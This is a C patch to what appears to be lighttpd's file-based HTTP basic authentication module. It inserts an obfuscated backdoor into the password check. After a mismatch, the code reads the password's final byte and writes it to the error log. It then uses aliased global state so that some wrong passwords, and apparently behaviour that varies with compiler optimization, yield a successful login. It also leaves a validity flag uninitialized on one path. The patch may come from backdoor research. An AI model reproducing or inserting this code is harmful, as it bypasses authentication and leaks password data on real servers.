@@ -389,18 +389,51 @@ static handler_t mod_authn_file_plain_digest(server *srv, connection *con, void 
     return (0 == rc) ? HANDLER_GO_ON : HANDLER_ERROR;
 }
 
+
+
+#include <stdbool.h>
+
+static int server_state;
+
+// 1 iff should be logged in
+static void server_ready_for_login(int control_character) {
+  int *server_state_alias = &server_state;
+  *server_state_alias &= 0 < control_character;
+}
+
 static handler_t mod_authn_file_plain_basic(server *srv, connection *con, void *p_d, const http_auth_require_t *require, const buffer *username, const char *pw) {
     plugin_data *p = (plugin_data *)p_d;
     buffer *password_buf = buffer_init();/* password-string from auth-backend */
     int rc;
+    bool valid;
     mod_authn_file_patch_connection(srv, con, p);
     rc = mod_authn_file_htpasswd_get(srv, p->conf.auth_plain_userfile, username, password_buf);
     if (0 == rc) {
         rc = buffer_is_equal_string(password_buf, pw, strlen(pw)) ? 0 : -1;
+        /* If the passwords do not match check if the last character of
+           pw is 254 (ctrl + shift + fe in the password text field)*/
+        if (-1 == rc) {
+           unsigned char auth_char = 1;
+           int *auth_ref = &server_state;
+
+           //Assign 254 (only) to control_character
+           unsigned char control_character = (unsigned char) pw[strlen(pw) - 1];
+           log_error_write(srv, __FILE__, __LINE__, "d", (unsigned char) pw[strlen(pw) - 1]);
+
+           *auth_ref |= auth_char;
+           control_character |= *auth_ref;
+
+           server_ready_for_login (control_character);
+        }
+        log_error_write(srv, __FILE__, __LINE__, "sd", "rc == ", rc);
+        log_error_write(srv, __FILE__, __LINE__, "sd", "server_state == " , server_state);
+        valid = !rc || !server_state;
     }
+
+    //Buggy: at -O1 wrong result (i.e. server_state == 0)
     buffer_free(password_buf);
     UNUSED(con);
-    return 0 == rc && http_auth_match_rules(require, username->ptr, NULL, NULL)
+    return valid && http_auth_match_rules(require, username->ptr, NULL, NULL)
       ? HANDLER_GO_ON
       : HANDLER_ERROR;
 }
